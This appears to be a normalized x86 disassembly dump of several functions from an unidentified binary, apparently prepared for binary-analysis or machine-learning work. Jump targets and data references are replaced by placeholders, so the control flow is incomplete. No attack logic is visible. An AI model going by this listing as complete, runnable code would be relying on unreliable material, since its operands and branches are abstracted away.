and esp 0xfffffff8
push 0xffffffff
push sub_43fb1c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ esp + 0x18 ] edi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x14 ] ebx
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
mov ebx r--data
test al al
je r-xdata
call sub_4071e7
mov ecx [ edi + 0x23c ]
mov [ edi + 0x48c ] eax
cmp ecx 0x2
jne r-xdata
mov [ esp + 0x13 ] 0x0
push ebx
lea ecx [ esp + 0x20 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0x3
mov eax [ esi ]
push ecx
mov ecx esi
mov [ esp + 0x1c ] 0x1
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
cmp ecx ebx
jle r-xdata
cmp [ edi + 0x235 ] bl
jne r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
and [ esp + 0x14 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x1
je r-xdata
cmp [ edi + 0x239 ] bl
je r-xdata
cmp [ edi + 0x164 ] ebx
je r-xdata
cmp [ edi + 0x164 ] ebx
je r-xdata
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
push 0x4
pop eax
lea ecx [ esp + 0x1c ]
push ecx
push eax
push 0x0
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] eax
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
mov ecx [ edi + 0x164 ]
test ecx ecx
je r-xdata
cmp [ edi + 0x236 ] bl
je r-xdata
cmp [ edi + 0x237 ] bl
je r-xdata
cmp [ edi + 0x235 ] bl
jne r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
and [ esp + 0x98 ] 0x0
lea eax [ esp + 0x1c ]
push eax
push 0x4
push 0x2
lea ebx [ edi + 0x384 ]
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
push 0xe
jmp r-xdata
test al 0x8
jne r-xdata
mov [ esp + 0x13 ] 0x0
push ebx
lea ecx [ esp + 0x20 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0x5
mov eax [ esi ]
or [ esp + 0x18 ] 0x2
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov [ edi + 0x235 ] 0x1
mov eax [ ecx ]
call [ eax + 0x10 ]
jmp r-xdata
test al 0x20
je r-xdata
cmp [ edi + 0x168 ] ebx
je r-xdata
cmp [ edi + 0x48b ] bl
je r-xdata
test al 0x1
je r-xdata
test al 0x8
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
and [ esp + 0x14 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x2
je r-xdata
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
push 0x2
pop eax
lea ecx [ esp + 0x1c ]
push ecx
push 0x4
mov [ esp + 0xa0 ] eax
push eax
jmp r-xdata
push 0x3
mov ebx edi
call sub_40de03
mov esi edi
call sub_40873c
jmp r-xdata
cmp [ edi + 0x234 ] bl
jne r-xdata
mov al [ edi + 0x48b ]
test al al
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
cmp [ eax + 0x14 ] ebx
je r-xdata
push 0x5
mov ebx edi
call sub_40de03
push edi
call sub_40783a
jmp r-xdata
push 0x1
mov ebx edi
call sub_40de03
push edi
call sub_40be60
jmp r-xdata
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea eax [ esp + 0x1c ]
push eax
push 0x4
push 0x2
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] 0x6
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
push 0xd
jmp r-xdata
lea ebx [ edi + 0x384 ]
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
push 0xc
jmp r-xdata
test al 0x40
je r-xdata
push 0x8
mov ebx edi
call sub_40de03
mov eax edi
call sub_4089a2
jmp r-xdata
cmp [ edi + 0x184 ] ebx
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
cmp [ eax + 0x14 ] ebx
je r-xdata
mov [ esp + 0x13 ] 0x0
push ebx
lea ecx [ esp + 0x20 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0x7
mov eax [ esi ]
or [ esp + 0x18 ] 0x4
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
push 0x2
mov ebx edi
call sub_40de03
push edi
call sub_408562
jmp r-xdata
test al al
je r-xdata
cmp [ edi + 0x1a0 ] ebx
je r-xdata
mov eax edi
call sub_4077bd
test al al
jne r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
and [ esp + 0x14 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x4
je r-xdata
mov esi 0x1000
test [ edi + 0x48c ] esi
je r-xdata
mov esi 0x800
test [ edi + 0x48c ] esi
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea eax [ esp + 0x1c ]
push eax
push 0x4
mov [ esp + 0xa0 ] 0x1
push 0x2
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea eax [ esp + 0x1c ]
push eax
push 0x4
push 0x2
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] 0x8
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
push 0xf
test al al
je r-xdata
test [ edi + 0x244 ] esi
jne r-xdata
test [ edi + 0x244 ] esi
jne r-xdata
mov [ esp + 0x13 ] 0x0
push ebx
lea ecx [ esp + 0x20 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0x9
mov eax [ esi ]
or [ esp + 0x18 ] 0x8
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
mov esi 0x400
test [ edi + 0x48c ] esi
je r-xdata
push 0x3
mov ebx edi
call sub_40de03
push esi
push edi
call sub_40bf38
jmp r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
and [ esp + 0x14 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x8
je r-xdata
test [ edi + 0x244 ] esi
je r-xdata
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea eax [ esp + 0x1c ]
push eax
push 0x4
push 0x0
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] 0xa
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
mov [ edi + 0x234 ] 0x1
jmp r-xdata
mov [ esp + 0x13 ] 0x0
push ebx
lea ecx [ esp + 0x20 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0xb
mov eax [ esi ]
or [ esp + 0x18 ] 0x10
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
mov ecx edi
call sub_40bc8c
jmp r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
and [ esp + 0x14 ] 0xffffffef
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x10
je r-xdata
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea eax [ esp + 0x1c ]
push eax
push 0x4
push 0x0
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] 0xc
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
mov eax [ esi ]
mov ecx esi
call [ eax + 0x2c ]
mov edx eax
mov ecx edi
call sub_40c3a7
jmp r-xdata
mov [ esp + 0x13 ] 0x0
push ebx
lea ecx [ esp + 0x20 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0xd
mov eax [ esi ]
or [ esp + 0x18 ] 0x20
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
and [ esp + 0x14 ] 0xffffffdf
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x20
je r-xdata
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea eax [ esp + 0x1c ]
push eax
push 0x4
push 0x2
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] 0xe
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
push edi
mov edi esi
call sub_40cc7f
mov ecx [ esp + 0x18 ]
mov eax [ ecx ]
push 0x10
xor bl bl
push ebx
lea ecx [ esp + 0x20 ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0xf
mov eax [ esi ]
or [ esp + 0x18 ] 0x40
push ecx
mov ecx esi
call [ eax + 0x44 ]
test al al
je r-xdata
test bl bl
je r-xdata
and [ esp + 0x14 ] 0xffffffbf
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
mov bl 0x1
jmp r-xdata
mov eax [ esi ]
push r--data
mov ecx esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
mov ebx 0x100
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea eax [ esp + 0x1c ]
push eax
push 0x4
push 0x0
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] 0x10
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
mov [ edi + 0x237 ] 0x1
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x40
je r-xdata
mov [ esp + 0x13 ] 0x0
push r--data
lea ecx [ esp + 0x3c ]
call sub_403dc1
mov [ esp + 0x98 ] 0x11
or [ esp + 0x14 ] 0x80
push r--data
lea ecx [ esp + 0x20 ]
call sub_403dc1
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x9c ] 0x12
mov eax [ esi ]
or [ esp + 0x18 ] ebx
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] 0x80
je r-xdata
and [ esp + 0x14 ] 0xfffffeff
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_40415f
test [ esp + 0x14 ] ebx
je r-xdata
cmp [ esp + 0x13 ] 0x0
mov ecx esi
je r-xdata
and [ esp + 0x14 ] 0xffffff7f
push 0x0
push 0x1
lea ecx [ esp + 0x40 ]
call sub_40415f
mov eax [ esi ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
mov ebx 0x200
test al al
je r-xdata
push edi
call sub_407ad0
jmp r-xdata
mov [ esp + 0x13 ] 0x0
push r--data
lea ecx [ esp + 0x74 ]
call sub_403dc1
mov [ esp + 0x98 ] 0x13
or [ esp + 0x14 ] ebx
push r--data
lea ecx [ esp + 0x58 ]
call sub_403dc1
lea ecx [ esp + 0x70 ]
push ecx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x9c ] 0x14
mov eax [ esi ]
or [ esp + 0x18 ] 0x400
push ecx
mov ecx esi
call [ eax + 0x44 ]
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
or [ esp + 0x98 ] 0xffffffff
test [ esp + 0x14 ] ebx
je r-xdata
and [ esp + 0x14 ] 0xfffffbff
push 0x0
push 0x1
lea ecx [ esp + 0x5c ]
call sub_40415f
test [ esp + 0x14 ] 0x400
je r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x78 ]
call sub_40415f
xor al al
push edi
mov ecx esi
call sub_4080c7
sub_4071e7
push 0x5c
mov eax sub_43c6e9
call sub_425dad
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
push r--data
call sub_40563c
pop ecx
test al al
jne r-xdata
mov edi r--data
xor ebx ebx
push edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] ebx
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
xor eax eax
jmp r-xdata
push edi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
mov [ ebp - 0x14 ] 0x8
call sub_425e4c
retn
push edi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x5
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x6
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
push eax
call sub_40750a
or [ ebp - 0x14 ] eax
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push edi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
or [ ebp - 0x14 ] 0x1
push edi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x9
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
or [ ebp - 0x14 ] 0x2
push edi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xc
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
or [ ebp - 0x14 ] 0x20
push edi
lea ecx [ ebp - 0x30 ]
call sub_403dc1
mov edi r--data
push edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xd
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
or [ ebp - 0x14 ] 0x10
cmp [ ebp - 0x14 ] ebx
jne r-xdata
push edi
lea ecx [ ebp - 0x68 ]
call sub_403dc1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0xf
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
push eax
call sub_4076e7
or [ ebp - 0x14 ] eax
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x20
sub_40750a
push 0x78
mov eax sub_43c64b
call sub_425dad
xor ebx ebx
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
mov esi r--data
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] ebx
call sub_403dc1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_41fddc
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push edi
lea ecx [ ebp - 0x4c ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_403dc1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_41fddc
push ebx
push edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push edi
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
mov [ ebp - 0x14 ] 0x100
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x4
call sub_403dc1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_41fddc
push ebx
push edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push edi
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
or [ ebp - 0x14 ] 0x200
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_41fddc
push ebx
push edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push edi
lea ecx [ ebp - 0x30 ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
or [ ebp - 0x14 ] 0x400
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_41fddc
push ebx
push edi
lea ecx [ ebp - 0x68 ]
mov [ ebp + 0xb ] al
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x84 ]
call sub_40415f
cmp [ ebp + 0xb ] bl
je r-xdata
or [ ebp - 0x14 ] 0x800
mov eax [ ebp - 0x14 ]
call sub_425e4c
retn 0x4
or [ ebp - 0x14 ] 0x1000
sub_4076e7
push 0x78
mov eax sub_43c5da
call sub_425dad
xor ebx ebx
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
mov esi r--data
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] ebx
call sub_403dc1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_41fddc
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
cmp [ ebp - 0xd ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x2
call sub_403dc1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_41fddc
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp + 0xb ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x84 ]
call sub_40415f
cmp [ ebp + 0xb ] bl
je r-xdata
mov [ ebp - 0x14 ] 0x40
mov eax [ ebp - 0x14 ]
call sub_425e4c
retn 0x4
or [ ebp - 0x14 ] 0x80
sub_4077bd
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx eax
mov eax [ ebx + 0x48c ]
push esi
mov esi 0x100
xor cl cl
mov [ ebp - 0x1 ] 0x1
test esi eax
je r-xdata
mov esi 0x200
test esi eax
je r-xdata
test [ ebx + 0x244 ] esi
je r-xdata
test al 0x20
jne r-xdata
test [ ebx + 0x244 ] esi
je r-xdata
cmp [ ebx + 0x489 ] cl
je r-xdata
push 0x3
call sub_40de03
mov esi ebx
call sub_40873c
cmp [ ebx + 0x489 ] cl
jne r-xdata
cmp [ ebx + 0x489 ] cl
jne r-xdata
push 0x3
call sub_40de03
push esi
push ebx
call sub_40bf38
jmp r-xdata
mov [ ebp - 0x1 ] cl
jmp r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
leave
retn
sub_40783a
push ebp
sub esp 0x60
push 0x54
mov eax sub_43c59c
call sub_425dad
mov eax [ ebp + 0x6c ]
xor esi esi
mov [ ebp + 0x60 ] esi
cmp [ eax + 0x488 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x64
leave
retn 0x4
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0x5c ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
xor ebx ebx
mov [ ebp + 0x58 ] esi
inc ebx
push r--data
lea ecx [ ebp - 0x44 ]
call sub_403dc1
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] bl
push r--data
lea ecx [ ebp ]
mov [ ebp + 0x60 ] ebx
call sub_403dc1
push esi
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp + 0x5c ]
mov [ ebp + 0x60 ] 0x3
call sub_41ec78
mov [ ebp + 0x58 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] bl
je r-xdata
and [ ebp + 0x60 ] 0xfffffffd
push esi
push ebx
lea ecx [ ebp ]
call sub_40415f
test [ ebp + 0x60 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_403dc1
mov ecx [ ebp + 0x58 ]
lea edx [ ebp + 0x38 ]
push edx
lea edx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ecx ]
push edx
call [ eax + 0x10 ]
push esi
push ebx
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
mov edi r--data
push edi
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push r--data
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
mov ecx [ ebp + 0x58 ]
lea edx [ ebp + 0x1c ]
push edx
lea edx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ ecx ]
push edx
call [ eax + 0x10 ]
push esi
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp + 0x1c ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0x5c ] eax
mov [ ebp - 0x4 ] 0x9
cmp eax esi
je r-xdata
and [ ebp + 0x60 ] 0xfffffffe
push esi
push ebx
lea ecx [ ebp - 0x44 ]
call sub_40415f
mov [ ebp + 0x5c ] esi
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xa
or [ ebp + 0x60 ] 0x4
push edi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
mov edi [ ebp + 0x58 ]
lea eax [ ebp + 0x1c ]
push eax
lea eax [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0xb
or [ ebp + 0x60 ] 0x8
push eax
push [ ebp + 0x5c ]
xor bl bl
call sub_41ed6b
xor ebx ebx
inc ebx
mov [ ebp + 0x5c ] eax
xor esi esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] 0x4
je r-xdata
and [ ebp + 0x60 ] 0xfffffff7
push esi
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
